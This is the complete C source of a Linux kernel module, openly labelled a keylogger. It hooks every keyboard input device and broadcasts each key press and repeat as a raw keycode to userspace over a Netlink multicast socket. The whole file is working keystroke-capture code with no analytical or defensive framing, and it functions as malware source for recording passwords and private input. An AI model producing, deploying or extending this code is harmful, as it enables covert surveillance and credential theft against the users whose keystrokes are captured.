#include "keylogger.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("System Administrator");
MODULE_DESCRIPTION("Input Subsystem Keylogger Module - Keyboard Only Mode");

static struct sock *netlink_socket = NULL; //maintains the Netlink socket for kernel-to-user communication.

/* Filter: Monitor only devices that report EV_KEY events. */
static const struct input_device_id keyboard_device_ids[] = {
    { .flags = INPUT_DEVICE_ID_MATCH_EVBIT, .evbit = { BIT_MASK(EV_KEY) } },
    { }, 
};
MODULE_DEVICE_TABLE(input, keyboard_device_ids);

/* Sends the raw keycode to userspace via Netlink broadcast. */
void send_keycode_to_user(unsigned int keycode) {
    struct sk_buff *socket_buffer;
    struct nlmsghdr *netlink_header;
    int payload_length = sizeof(unsigned int);

    socket_buffer = nlmsg_new(payload_length, GFP_ATOMIC);
    if (!socket_buffer) {
        return;
    }

    netlink_header = nlmsg_put(socket_buffer, 0, 0, NLMSG_DONE, payload_length, 0);
    NETLINK_CB(socket_buffer).dst_group = NETLINK_MULTICAST_GROUP;

    /* Copy the raw keycode into the payload */
    memcpy(nlmsg_data(netlink_header), &keycode, payload_length);
    
    netlink_broadcast(netlink_socket, socket_buffer, 0, NETLINK_MULTICAST_GROUP, GFP_ATOMIC);
}

/* Processes input events and filters for key presses and repeats. */
static void handle_keyboard_event(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int event_value) {
    /* Capture both initial key presses AND held down key repeats */
    if (event_type == EV_KEY && (event_value == KEY_PRESSED_STATE || event_value == KEY_REPEATED_STATE)) {
        send_keycode_to_user(event_code);
    }
}

/* Associates the handler with compatible input devices (keyboards). */
static int connect_keyboard_device(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *device_handle;
    
    /* Filter: Ensure the device is actually a keyboard by checking for the 'A' key. */
    if (!test_bit(KEY_A, dev->keybit)) {
        return -ENODEV;
    }

    device_handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!device_handle) {
        return -ENOMEM;
    }

    device_handle->dev = dev;
    device_handle->handler = handler;
    device_handle->name = "keylogger_handle";

    /* Register and open connection to device input stream */
    if (input_register_handle(device_handle)) { 
        kfree(device_handle); 
        return -EINVAL; 
    }
    
    input_open_device(device_handle);
    printk(KERN_INFO "Keylogger: Attached to keyboard: %s\n", dev->name);
    
    return 0;
}

/* Cleans up the device handle upon disconnection. */
static void disconnect_keyboard_device(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static struct input_handler keylogger_input_handler = {
    .event = handle_keyboard_event,
    .connect = connect_keyboard_device,
    .disconnect = disconnect_keyboard_device,
    .name = "keylogger_handler",
    .id_table = keyboard_device_ids,
};

/* Initializes the Netlink socket and registers the input handler. */
int __init initialize_keylogger_module(void) {
    struct netlink_kernel_cfg netlink_config = { .input = NULL };
    
    /* Create Netlink socket for kernel-to-user communication */
    netlink_socket = netlink_kernel_create(&init_net, NETLINK_USER_PROTOCOL, &netlink_config);
    if (!netlink_socket) {
        return -ENOMEM;
    }
    
    /* Register input handler to catch hardware events */
    if (input_register_handler(&keylogger_input_handler)) {
        netlink_kernel_release(netlink_socket);
        return -EINVAL;
    }

    printk(KERN_INFO "Keylogger: Keyboard-only module initialized.\n");
    return 0;
}

/* Unregisters the handler and closes the socket. */
void __exit cleanup_keylogger_module(void) {
    input_unregister_handler(&keylogger_input_handler);
    if (netlink_socket) {
        netlink_kernel_release(netlink_socket);
    }
    printk(KERN_INFO "Keylogger: Module unloaded.\n");
}

module_init(initialize_keylogger_module);
module_exit(cleanup_keylogger_module);